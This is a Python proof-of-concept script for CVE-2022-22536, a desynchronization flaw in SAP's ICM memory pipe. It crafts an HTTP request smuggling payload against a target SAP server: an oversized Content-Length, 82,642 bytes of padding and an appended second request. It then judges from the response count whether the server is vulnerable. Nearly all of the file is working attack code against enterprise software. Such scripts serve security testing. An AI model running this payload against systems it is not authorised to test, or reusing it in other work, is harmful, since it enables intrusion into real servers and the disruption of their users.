# title: SAP内存管道非同步化漏洞(MPI) CVE-2022-22536
# author: antx
# cveid: CVE-2022-22536

from poctools import BasicPoc
import re
import ssl
import socket


class SAPoc(BasicPoc):
    TEST_RESOURCES = (
        '/sap/admin/public/default.html?aaa',
        '/sap/public/bc/ur/Login/assets/corbu/sap_logo.png'
    )
    RESPONSE_PATTERN = (
            r'(?P<version>HTTP/\S+) '
            + r'(?P<status_code>\d{3}) '
            + r'(?P<status_text>.+)'
            + '\r\n'
    )

    def __init__(self):
        super(SAPoc, self).__init__()
        self.name = 'SAP-Poc'

    def verify(self, url: str):
        hp = url.split('://')[1]
        host = hp.split(':')[0]
        port = int(hp.split(':')[1])
        try:
            resource = self.validate_resource_and_cache(host, port, secure=False, cert_verify=False)
            if resource is not None:
                vulnerable = self.execute(host, port, resource=resource, secure=False, cert_verify=False)
                if vulnerable:
                    print(f'{host}:{port} vulnerable')
                    return True
                else:
                    print(f'{host}:{port} not vulnerable')
            else:
                print('No valid resource test found, is not possible to test')
        except ssl.SSLError:
            print(('SSL error, set cert_verify=False ' + 'for self signed certificates'))
        except ConnectionRefusedError as e:
            print(e)
        except ConnectionResetError:
            print('Connection reset by peer, set secure=True for ssl')
        return False

    def craft_ssl_context(self, cert_verify: bool = True) -> ssl.SSLContext:
        """Crafts the ssl context wrapper and sets verification options"""
        print(f'Setting SSL context with verify mode {cert_verify}')
        context = ssl.SSLContext()
        # By default we check valid for cert security
        if cert_verify:
            context.verify_mode = ssl.CERT_REQUIRED
            context.check_hostname = True
            context.load_default_certs()
        else:
            context.verify_mode = ssl.CERT_NONE
            context.check_hostname = False
        return context

    def craft_socket(self, server_hostname: str = None, secure: bool = False,
                     cert_verify: bool = True) -> socket.socket:
        """Crafts the socket and wraps the ssl connection if it's required"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('Crafting socket')
        if secure:
            context = self.craft_ssl_context(cert_verify=cert_verify)
            print('Wraping socket with SSL')
            s = context.wrap_socket(s, server_hostname=server_hostname)
        return s

    def craft_payload(self, host: str, port: int, method: str = 'GET', resource: str = None) -> bytes:
        """Crafts the required payload and the proxy aligment"""
        print(f'Crafting payload for {host}:{port}')
        action = f'{method} {resource} HTTP/1.1'
        host_header = f'Host: {host}:{port}'
        padding = 'A' * 82642
        header_separator = '\r\n'
        content_separator = header_separator * 2
        # Proxy will match the amount of responses to the requests amounts
        proxy_alignment = f'GET / HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n'
        payload = (action
                   + header_separator
                   + host_header
                   + header_separator
                   + 'User-Agent: CVE-2022-22536 poc tool'
                   + header_separator
                   + 'Content-Length: 82646'
                   + header_separator
                   + 'Connection: keep-alive'
                   + content_separator
                   + padding
                   + content_separator
                   + proxy_alignment)
        return payload.encode()

    def parse_response(self, data: bytes) -> dict:
        """Encode and parse the responses"""
        enc_data = data.decode('utf-8', errors='replace')
        compiled_pattern = re.compile(self.RESPONSE_PATTERN)
        response_count = 0
        responses = []
        for r in compiled_pattern.finditer(enc_data):
            response_count += 1
            d = r.groupdict()
            responses.append(d)
        results = {
            'count': response_count,
            'total_size': len(data),
            'responses': responses
        }
        return results

    def validate_resource_and_cache(self, host: str, port: int, secure: bool = False, cert_verify: bool = False) -> str:
        """Performs requests to check and cache resources"""
        for r in self.TEST_RESOURCES:
            s = self.craft_socket(server_hostname=host, secure=secure, cert_verify=cert_verify)
            s.connect((host, port))
            print(f'Connection established {host}:{port}')
            print(f'Validating resource {r}')
            payload = ('{method} {resource} HTTP/1.1\r\n' + 'Host: {host}:{port}\r\n\r\n')
            payload = payload.format(method='GET', resource=r, host=host, port=port)
            payload = payload.encode()
            data = self.send_payload(s, payload)
            resp = self.parse_response(data)
            if resp['count'] > 0 and resp['responses'][0]['status_code'] == '200':
                print(f'Resource {r} seems valid')
                return r
            print(f'Resource {r} seems not valid. Status code {resp["responses"][0]["status_code"]}')
            s.close()
        return None

    def send_payload(self, s: socket.socket, payload: bytes = None) -> bytes:
        s.send(payload)
        print('Payload sent')
        data = b''
        s.settimeout(3.0)
        try:
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        s.close()
        return data

    def execute(self, host: str, port: int, resource: str = None, secure: bool = False,
                cert_verify: bool = False) -> str:
        s = self.craft_socket(server_hostname=host, secure=secure, cert_verify=cert_verify)
        s.connect((host, port))
        print(f'Connection established {host}:{port}')
        payload = self.craft_payload(host, port, resource=resource)
        data = self.send_payload(s, payload)
        results = self.parse_response(data)
        print('Response count: {}'.format(results['count']))
        self.debug_responses(results['responses'])
        s.close()
        scp = re.compile(r'^(400|5[0-9]{2})$')
        return results['count'] > 1 and scp.match(results['responses'][1]['status_code'])

    def debug_responses(self, responses: dict) -> None:
        for i, r in enumerate(responses):
            print(f'Response {i}: {r["status_code"]} {r["status_text"]}')


if __name__ == '__main__':
    target = 'https://127.0.0.1:8000'
    tp = SAPoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
